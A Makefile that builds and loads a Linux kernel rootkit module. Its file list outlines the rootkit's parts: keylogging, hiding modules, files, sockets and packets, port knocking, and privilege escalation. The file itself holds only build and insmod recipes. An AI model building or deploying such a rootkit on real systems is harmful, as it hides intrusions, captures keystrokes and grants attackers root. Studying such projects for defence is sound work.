# Module name
ROOTKIT		:= rootkit

# Build
UNAME 		:= $(shell uname -r)
MODULEDIR	:= /lib/modules/$(UNAME)
BUILDDIR	:= $(MODULEDIR)/build
KERNELDIR 	:= $(MODULEDIR)/kernel

# Source files
SRCS_S 		:= src
LIBS_S 		:= src/libs
INCL_S 		:= src/include

# Header files
SRCS_H		:= $(PWD)/$(SRCS_S)/headers
LIBS_H		:= $(PWD)/$(LIBS_S)/headers
INCL_H		:= $(PWD)/$(INCL_S)/headers

# Files
CORE		:= src/core.c
CORE_OBJS	:= $(patsubst %.c, %.o, $(CORE))
SRCS		:= $(filter-out $(CORE), $(wildcard $(SRCS_S)/*.c))
SRCS_OBJS	:= $(patsubst %.c, %.o, $(SRCS))
LIBS		:= $(wildcard $(LIBS_S)/*.c)
LIBS_OBJS	:= $(patsubst %.c, %.o, $(LIBS))
INCL 		:= $(wildcard $(INCL_S)/*.c)
INCL_OBJS	:= $(patsubst %.c, %.o, $(INCL))

# Module
obj-m 			:= $(ROOTKIT).o

# Not working
# $(ROOTKIT)-y	+= $(CORE_OBJS) $(SRCS_OBJS) $(LIBS_OBJS) $(INCL_OBJS)

$(ROOTKIT)-y 	+= src/core.o src/libs/syscalltable.o src/network_keylog.o src/server.o 
$(ROOTKIT)-y 	+= src/module_hiding.o src/getdents_hook.o src/socket_hiding.o src/packet_hiding.o 
$(ROOTKIT)-y 	+= src/port_knocking.o src/privilege_escalation.o src/include/utils.o

ccflags-y		:= -I$(SRCS_H) -I$(LIBS_H) -I$(INCL_H)

# Recipes
all:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules

load:
	insmod $(KERNELDIR)/net/ipv4/netfilter/nf_reject_ipv4.ko
	insmod $(KERNELDIR)/net/ipv6/netfilter/nf_reject_ipv6.ko
	insmod rootkit.ko

clean:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) clean